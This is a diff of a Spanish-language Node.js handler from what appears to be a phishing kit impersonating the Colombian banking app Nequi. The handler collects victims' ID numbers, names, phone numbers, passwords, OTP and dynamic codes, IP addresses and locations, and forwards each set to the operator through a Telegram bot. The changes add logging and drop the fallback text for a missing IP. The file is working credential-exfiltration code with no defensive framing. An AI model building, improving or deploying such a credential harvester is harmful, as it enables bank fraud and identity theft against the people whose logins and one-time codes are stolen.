@@ -21,12 +21,14 @@ module.exports = async function handler(req, res) {
         const body = req.body;
 
         if (!body) {
+            console.error('El cuerpo de la solicitud está vacío');
             return res.status(400).json({ error: 'El cuerpo de la solicitud está vacío' });
         }
 
         const { documentNumber, fullName, username, password, userIP, city, country, otpCode, dynamicCode, step } = body;
 
         if (!documentNumber || !fullName || !userIP) {
+            console.error('Datos incompletos: documento, nombre o IP faltante');
             return res.status(400).json({ error: 'Datos incompletos: documento, nombre o IP faltante' });
         }
 
@@ -40,7 +42,7 @@ module.exports = async function handler(req, res) {
 #️⃣ Número: ${username || 'No proporcionado'}
 🔐 Clave: ${password || 'No proporcionada'}
 🔐 Código Dinámico 2: ${dynamicCode || 'No proporcionado'}
-🌏 IP: ${userIP || 'Desconocida'}
+🌏 IP: ${userIP}
 📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
 `.trim();
         } else if (step === "dinamica3") {
@@ -51,7 +53,7 @@ module.exports = async function handler(req, res) {
 #️⃣ Número: ${username || 'No proporcionado'}
 🔐 Clave: ${password || 'No proporcionada'}
 🔐 Código Dinámico 3: ${dynamicCode || 'No proporcionado'}
-🌏 IP: ${userIP || 'Desconocida'}
+🌏 IP: ${userIP}
 📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
 `.trim();
         } else if (otpCode) {
@@ -62,7 +64,7 @@ module.exports = async function handler(req, res) {
 #️⃣ Número: ${username || 'No proporcionado'}
 🔐 Clave: ${password || 'No proporcionada'}
 🔐 OTP: ${otpCode}
-🌏 IP: ${userIP || 'Desconocida'}
+🌏 IP: ${userIP}
 📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
 `.trim();
         } else if (!username && !password) {
@@ -70,7 +72,7 @@ module.exports = async function handler(req, res) {
 ⭐️⭐️Nequi 2.0⭐️⭐️
 🪪ID: ${documentNumber}
 👤Nombres: ${fullName}
-🌏IP: ${userIP || 'Desconocida'}
+🌏IP: ${userIP}
 🏙Ciudad: ${city || 'Desconocida'}
 🇨🇴País: ${country || 'Desconocido'}
 `.trim();
@@ -81,7 +83,7 @@ module.exports = async function handler(req, res) {
 🪪Cédula: ${documentNumber}
 #️⃣Número: ${username || 'No proporcionado'}
 🔐Clave: ${password || 'No proporcionada'}
-🌏IP: ${userIP || 'Desconocida'}
+🌏IP: ${userIP}
 🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
 `.trim();
         }
@@ -97,6 +99,8 @@ module.exports = async function handler(req, res) {
             ]
         };
 
+        console.log('Enviando mensaje a Telegram:', message);
+
         const response = await axios.post(
             `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
             {
@@ -105,6 +109,12 @@ module.exports = async function handler(req, res) {
                 reply_markup: buttonMarkup
             }
         );
+
+        if (response.data.ok) {
+            console.log('Mensaje enviado exitosamente a Telegram');
+        } else {
+            console.error('Error al enviar mensaje a Telegram:', response.data);
+        }
 
         res.status(200).json({ success: true, data: response.data });
     } catch (error) {
